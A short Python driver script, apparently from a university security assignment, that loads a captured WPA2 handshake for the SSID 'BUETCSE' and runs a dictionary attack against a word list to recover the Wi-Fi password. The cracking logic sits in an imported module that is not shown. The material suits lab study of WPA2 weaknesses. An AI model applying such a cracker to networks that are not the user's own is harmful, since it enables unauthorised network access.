from WPA2Cracker import *


def main():
    """
    MAIN EXECUTION FLOW:
    1. Parse capture file to extract 4-way handshake
    2. Read dictionary file with candidate passwords
    3. Perform dictionary attack to crack WPA2 password
    """

    # Configuration
    capture_file = "handshake2.cap"
    ssid = "BUETCSE" # "ikeriri-5g"
    dictionary_file = "dictionary.txt"

    # Initialize cracker and extract handshake
    cracker = WPA2Cracker(capture_file, ssid)
    print("🔍 Extracting handshake...")

    if not cracker.extract_handshake():
        print("❌ Handshake extraction failed")
        return

    # Perform dictionary attack
    print("⚡ Starting dictionary attack...")
    result = cracker.dictionary_attack(dictionary_file)

    if result:
        print(f"🎯 SUCCESS! Cracked password: {result}")
    else:
        print("💥 Attack failed - password not in dictionary")


if __name__ == "__main__":
    main()